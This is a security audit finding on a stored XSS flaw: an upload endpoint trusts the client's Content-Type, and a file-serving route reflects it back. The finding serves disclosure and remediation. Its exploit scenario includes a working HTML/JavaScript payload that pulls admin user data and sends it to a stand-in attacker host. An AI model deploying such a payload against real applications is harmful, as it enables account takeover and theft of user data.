# FINDING-05: Stored XSS via Unvalidated Content-Type on File Upload/Serving

## Severity: HIGH

**CVSS 3.1 Estimate:** 7.1 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)

## Status: CONFIRMED

## Location

- `extraction-service/app/api.py`, lines 133-134 (upload / store)
- `extraction-service/app/api.py`, lines 195-202 (serve back)

## Description

When a file is uploaded, the server stores the client-provided `Content-Type` header value directly into the database without validation. When the file is later served back to users via `GET /api/jobs/{job_id}/pdf`, it is returned with the stored MIME type as the response's `media_type`. An attacker with upload privileges can upload an HTML file with `Content-Type: text/html`, and when any user views the document, the browser renders the HTML, executing embedded JavaScript.

## Proof / Reasoning

**Upload -- stores client-provided content-type (api.py, line 133-134):**
```python
db.add(DocumentFile(job_id=job.id, filename=file.filename or "document.pdf",
                    mime=file.content_type or "application/pdf", data=data))
```

`file.content_type` is whatever the HTTP client sent in the multipart upload -- entirely attacker-controlled.

**Serving -- reflects stored content-type back (api.py, lines 195-202):**
```python
@app.get("/api/jobs/{job_id}/pdf")
def get_pdf(job_id: str, user: User = Depends(get_current_user), db=Depends(get_db)):
    require_job_access(db, user, job_id)
    f = db.get(DocumentFile, job_id)
    if not f:
        raise HTTPException(404, "no source file stored for this document")
    return Response(content=f.data, media_type=f.mime or "application/pdf",
                    headers={"Content-Disposition": f'inline; filename="{f.filename}"'})
```

The `media_type=f.mime` comes directly from the stored attacker-controlled value. With `Content-Disposition: inline`, the browser will render the content.

## Impact

- **Stored XSS:** An attacker (any user with `analyst` role and upload access) uploads malicious HTML. When another user (including admins) views the document, JavaScript executes in their browser session.
- **Session theft:** The XSS can steal the victim's access token from memory (Zustand store) or trigger actions on their behalf.
- **Privilege escalation chain:** Analyst uploads XSS -> admin views it -> XSS steals admin session -> attacker has admin access.

## Exploit Scenario

1. Attacker (analyst role) crafts an HTML file:
   ```html
   <html><body><script>
     fetch('/admin/users').then(r=>r.json()).then(d=>
       fetch('https://attacker.com/log?data='+btoa(JSON.stringify(d))))
   </script><h1>Loading document...</h1></body></html>
   ```
2. Attacker uploads this file via `POST /api/jobs` with `Content-Type: text/html` in the multipart file field.
3. Admin clicks the "Document" tab for this job, which fetches `GET /api/jobs/{id}/pdf`.
4. Browser receives the response with `Content-Type: text/html` and renders it, executing the script.
5. The script exfiltrates user data to the attacker's server.

## Remediation

1. **Validate and override the content-type** on upload:
   ```python
   ALLOWED_MIMES = {"application/pdf", "application/vnd.openxmlformats-officedocument.wordprocessingml.document"}
   mime = file.content_type if file.content_type in ALLOWED_MIMES else "application/pdf"
   ```

2. **Always serve stored files with a safe content-type** (e.g., `application/pdf` or `application/octet-stream`).

3. **Add security headers** to the file-serving response:
   - `Content-Security-Policy: sandbox` -- prevents script execution even if content-type is wrong
   - `X-Content-Type-Options: nosniff` -- prevents MIME-type sniffing
   - `Content-Disposition: attachment` instead of `inline` for untrusted content
